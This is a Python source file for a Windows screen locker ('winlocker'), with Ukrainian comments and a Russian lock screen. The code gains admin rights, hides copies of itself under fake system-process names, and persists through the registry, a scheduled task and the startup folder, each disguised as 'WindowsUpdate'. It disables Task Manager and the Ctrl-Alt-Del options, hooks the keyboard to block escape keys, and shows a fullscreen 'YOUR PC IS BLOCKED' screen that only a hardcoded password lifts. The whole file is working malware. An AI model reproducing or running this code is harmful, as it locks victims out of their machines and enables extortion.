import os
import sys
import ctypes
import time
import threading
import winreg
import shutil
import random
import string
import tkinter as tk
from tkinter import *
import keyboard
import subprocess

# ===================== ПІДВИЩЕННЯ ПРАВ =====================
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

run_as_admin()

# ===================== ПРИХОВАНА ПАПКА =====================
def get_hidden_folder():
    program_data = os.environ.get('PROGRAMDATA', 'C:\\ProgramData')
    hidden_folder = os.path.join(program_data, 'Microsoft', 'Windows', 'Caches', 'Temp')
    
    if not os.path.exists(hidden_folder):
        app_data = os.environ.get('APPDATA', os.path.expanduser('~\\AppData\\Roaming'))
        hidden_folder = os.path.join(app_data, 'Microsoft', 'Windows', 'Themes', 'Cache')
    
    os.makedirs(hidden_folder, exist_ok=True)
    
    try:
        ctypes.windll.kernel32.SetFileAttributesW(hidden_folder, 0x02)
    except:
        pass
    
    return hidden_folder

def get_random_filename():
    prefixes = ['svchost', 'winlogon', 'csrss', 'services', 'lsass', 'explorer', 'dwm', 'taskhost']
    prefix = random.choice(prefixes)
    suffix = ''.join(random.choices(string.digits, k=4))
    return f"{prefix}_{suffix}.pyw"

def copy_to_hidden_folder():
    try:
        hidden_folder = get_hidden_folder()
        current_path = os.path.abspath(sys.argv[0])
        
        new_name = get_random_filename()
        new_path = os.path.join(hidden_folder, new_name)
        
        shutil.copy2(current_path, new_path)
        
        try:
            ctypes.windll.kernel32.SetFileAttributesW(new_path, 0x02)
        except:
            pass
        
        return new_path
    except:
        return None

def get_script_path():
    return os.path.abspath(sys.argv[0])

def get_hidden_executable():
    hidden_folder = get_hidden_folder()
    if not os.path.exists(hidden_folder):
        return None
    
    for file in os.listdir(hidden_folder):
        if file.endswith('.pyw') and any(file.startswith(p) for p in ['svchost', 'winlogon', 'csrss', 'services', 'lsass', 'explorer', 'dwm', 'taskhost']):
            return os.path.join(hidden_folder, file)
    return None

# ===================== АВТОЗАВАНТАЖЕННЯ =====================
def add_to_startup_registry():
    try:
        hidden_path = get_hidden_executable()
        if not hidden_path:
            hidden_path = get_script_path()
        
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, f'"{sys.executable}" "{hidden_path}"')
        return True
    except:
        return False

def remove_from_startup_registry():
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.DeleteValue(reg_key, "WindowsUpdate")
    except:
        pass

def add_to_startup_schtasks():
    try:
        hidden_path = get_hidden_executable()
        if not hidden_path:
            hidden_path = get_script_path()
        
        task_name = "WindowsUpdateService"
        cmd = f'schtasks /create /tn "{task_name}" /tr "{sys.executable} {hidden_path}" /sc onlogon /f /ru {os.getlogin()}'
        subprocess.run(cmd, shell=True, capture_output=True)
        return True
    except:
        return False

def remove_from_startup_schtasks():
    try:
        task_name = "WindowsUpdateService"
        subprocess.run(f'schtasks /delete /tn "{task_name}" /f', shell=True, capture_output=True)
    except:
        pass

def add_to_startup_folder():
    try:
        hidden_path = get_hidden_executable()
        if not hidden_path:
            hidden_path = get_script_path()
        
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        bat_path = os.path.join(startup_folder, "WindowsUpdate.bat")
        with open(bat_path, 'w') as f:
            f.write(f'@echo off\n"{sys.executable}" "{hidden_path}"')
        return True
    except:
        return False

def remove_from_startup_folder():
    try:
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        bat_path = os.path.join(startup_folder, "WindowsUpdate.bat")
        if os.path.exists(bat_path):
            os.remove(bat_path)
    except:
        pass

def add_to_startup_all():
    add_to_startup_registry()
    add_to_startup_schtasks()
    add_to_startup_folder()

def remove_from_startup_all():
    remove_from_startup_registry()
    remove_from_startup_schtasks()
    remove_from_startup_folder()

# ===================== БЛОКУВАННЯ =====================
def disable_task_manager():
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        with winreg.CreateKey(key, subkey) as reg_key:
            winreg.SetValueEx(reg_key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        return True
    except:
        return False

def enable_task_manager():
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.DeleteValue(reg_key, "DisableTaskMgr")
        return True
    except:
        return False

def disable_alt_tab():
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Explorer"
        with winreg.CreateKey(key, subkey) as reg_key:
            winreg.SetValueEx(reg_key, "AltTabSettings", 0, winreg.REG_DWORD, 1)
        return True
    except:
        return False

def enable_alt_tab():
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Explorer"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.DeleteValue(reg_key, "AltTabSettings")
        return True
    except:
        return False

def disable_win_registry():
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
        with winreg.CreateKey(key, subkey) as reg_key:
            winreg.SetValueEx(reg_key, "NoWinKeys", 0, winreg.REG_DWORD, 1)
        return True
    except:
        return False

def enable_win_registry():
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.DeleteValue(reg_key, "NoWinKeys")
        return True
    except:
        return False

def disable_ctrl_alt_del_options():
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        with winreg.CreateKey(key, subkey) as reg:
            for val in ["DisableTaskMgr", "DisableChangePassword", "DisableLockWorkstation", "DisableLogoff", "DisableSwitchUser"]:
                winreg.SetValueEx(reg, val, 0, winreg.REG_DWORD, 1)
        key = winreg.HKEY_LOCAL_MACHINE
        subkey = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        with winreg.CreateKey(key, subkey) as reg:
            winreg.SetValueEx(reg, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        return True
    except:
        return False

def enable_ctrl_alt_del_options():
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg:
            for val in ["DisableTaskMgr", "DisableChangePassword", "DisableLockWorkstation", "DisableLogoff", "DisableSwitchUser"]:
                try:
                    winreg.DeleteValue(reg, val)
                except:
                    pass
        key = winreg.HKEY_LOCAL_MACHINE
        subkey = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg:
            try:
                winreg.DeleteValue(reg, "DisableTaskMgr")
            except:
                pass
    except:
        pass

def restart_explorer():
    try:
        subprocess.run("taskkill /f /im explorer.exe", shell=True, capture_output=True)
        time.sleep(0.5)
        subprocess.run("start explorer.exe", shell=True)
        return True
    except:
        return False

# ===================== НИЗЬКОРІВНЕВИЙ ХУК =====================
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104

VK_LWIN = 0x5B
VK_RWIN = 0x5C
VK_TAB = 0x09
VK_ESCAPE = 0x1B
VK_F4 = 0x73
VK_CONTROL = 0x11
VK_SHIFT = 0x10
VK_MENU = 0x12

hook_handle = None
hook_proc = None
blocked = True

def low_level_handler(nCode, wParam, lParam):
    if nCode >= 0 and blocked:
        kbd = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_ulong)).contents
        vk = kbd & 0xFF
        if vk in (VK_LWIN, VK_RWIN):
            return 1
        if vk == VK_TAB and (ctypes.windll.user32.GetAsyncKeyState(VK_MENU) & 0x8000):
            return 1
        if vk == VK_ESCAPE:
            ctrl = (ctypes.windll.user32.GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0
            shift = (ctypes.windll.user32.GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0
            if ctrl and shift:
                return 1
        if vk == VK_F4 and (ctypes.windll.user32.GetAsyncKeyState(VK_MENU) & 0x8000):
            return 1
    return ctypes.windll.user32.CallNextHookEx(0, nCode, wParam, lParam)

def install_hook():
    global hook_handle, hook_proc
    try:
        HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_ulong))
        hook_proc = HOOKPROC(low_level_handler)
        hook_handle = ctypes.windll.user32.SetWindowsHookExW(
            WH_KEYBOARD_LL,
            hook_proc,
            ctypes.windll.kernel32.GetModuleHandleW(None),
            0
        )
        return hook_handle is not None
    except:
        return False

def remove_hook():
    global hook_handle
    if hook_handle:
        ctypes.windll.user32.UnhookWindowsHookEx(hook_handle)
        hook_handle = None

# ===================== ФОНОВИЙ МОНІТОР =====================
def monitor_loop():
    while True:
        try:
            hwnd = ctypes.windll.user32.FindWindowW("DV2ControlHost", None)
            if hwnd:
                ctypes.windll.user32.PostMessageW(hwnd, 0x0010, 0, 0)
            hwnd = ctypes.windll.user32.FindWindowW("Start", None)
            if hwnd:
                ctypes.windll.user32.PostMessageW(hwnd, 0x0010, 0, 0)
            hwnd = ctypes.windll.user32.FindWindowW("TaskManagerWindow", None)
            if hwnd:
                ctypes.windll.user32.PostMessageW(hwnd, 0x0010, 0, 0)
        except:
            pass
        time.sleep(0.3)

# ===================== БЛОКУВАННЯ / РОЗБЛОКУВАННЯ =====================
def lock_all():
    threading.Thread(target=copy_to_hidden_folder, daemon=True).start()
    threading.Thread(target=add_to_startup_all, daemon=True).start()
    disable_task_manager()
    disable_alt_tab()
    disable_win_registry()
    disable_ctrl_alt_del_options()
    threading.Thread(target=restart_explorer, daemon=True).start()
    install_hook()
    keyboard.block_key("win")
    keyboard.block_key("ctrl")
    keyboard.block_key("alt")
    keyboard.block_key("del")
    keyboard.block_key("esc")
    keyboard.block_key("tab")
    threading.Thread(target=monitor_loop, daemon=True).start()

def delete_self():
    try:
        hidden_path = get_hidden_executable()
        if hidden_path and os.path.exists(hidden_path):
            os.remove(hidden_path)
        current_path = get_script_path()
        if os.path.exists(current_path) and current_path != hidden_path:
            subprocess.Popen(f'cmd /c del /f /q "{current_path}"', shell=True)
    except:
        pass

def unlock_all():
    global blocked
    blocked = False
    remove_hook()
    enable_task_manager()
    enable_alt_tab()
    enable_win_registry()
    enable_ctrl_alt_del_options()
    keyboard.unblock_key("win")
    keyboard.unblock_key("ctrl")
    keyboard.unblock_key("alt")
    keyboard.unblock_key("del")
    keyboard.unblock_key("esc")
    keyboard.unblock_key("tab")
    threading.Thread(target=restart_explorer, daemon=True).start()
    remove_from_startup_all()
    threading.Thread(target=delete_self, daemon=True).start()

# ===================== GUI =====================
def check_password(event=None):
    if entry.get() == "9vb48LFH":
        unlock_all()
        root.destroy()
    else:
        lbl_status.config(text="❌ Неверний пароль!", fg="red")
        entry.delete(0, END)

# Швидке створення GUI
root = Tk()
root.title("Винлокер")
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
root.overrideredirect(True)
root.configure(bg="black")

lbl_title = Label(root, text="ВАШ ПК ЗАБЛОКИРОВАН", font=("Arial", 40, "bold"), fg="red", bg="black")
lbl_title.pack(pady=50)

lbl_info = Label(root, text="Для разблокирвоки введите пароль", font=("Arial", 20), fg="white", bg="black")
lbl_info.pack(pady=20)

entry = Entry(root, font=("Arial", 25), width=20)
entry.pack(pady=20)
entry.focus_set()
entry.bind("<Return>", check_password)

btn = Button(root, text="Разблокировать", font=("Arial", 20), command=check_password, bg="green", fg="white")
btn.pack(pady=10)

lbl_status = Label(root, text="", font=("Arial", 16), bg="black")
lbl_status.pack(pady=10)

# ==================== ЕКРАННА КЛАВІАТУРА ====================
shift_pressed = False

def add_char(char):
    if shift_pressed:
        char = char.upper()
    entry.insert(tk.END, char)
    entry.focus()

def backspace():
    current = entry.get()
    if current:
        entry.delete(len(current)-1, tk.END)

def clear():
    entry.delete(0, tk.END)

def toggle_shift():
    global shift_pressed
    shift_pressed = not shift_pressed
    btn_shift.config(bg="lightblue" if shift_pressed else "gray")

keyboard_frame = Frame(root, bg="black")
keyboard_frame.pack(pady=10)

def create_key(parent, text, width=5, height=2, command=None):
    btn = Button(parent, text=text, font=("Arial", 14), width=width, height=height,
                 command=command, bg="gray", fg="white", relief="raised")
    btn.pack(side=LEFT, padx=2, pady=2)
    return btn

row1 = Frame(keyboard_frame, bg="black")
row1.pack()
for c in "1234567890":
    create_key(row1, c, command=lambda char=c: add_char(char))

row2 = Frame(keyboard_frame, bg="black")
row2.pack()
for c in "qwertyuiop":
    create_key(row2, c, command=lambda char=c: add_char(char))

row3 = Frame(keyboard_frame, bg="black")
row3.pack()
for c in "asdfghjkl":
    create_key(row3, c, command=lambda char=c: add_char(char))

row4 = Frame(keyboard_frame, bg="black")
row4.pack()
for c in "zxcvbnm":
    create_key(row4, c, command=lambda char=c: add_char(char))

row5 = Frame(keyboard_frame, bg="black")
row5.pack()

btn_shift = create_key(row5, "Shift", width=6, command=toggle_shift)
btn_space = create_key(row5, "Space", width=8, command=lambda: add_char(" "))
btn_back = create_key(row5, "⌫", width=6, command=backspace)
btn_clear = create_key(row5, "Очистить", width=8, command=clear)
btn_enter = create_key(row5, "Ввод", width=6, command=check_password)
btn_enter.config(bg="green")

# ===================== ЗАПУСК БЛОКУВАННЯ =====================
lock_all()

root.mainloop()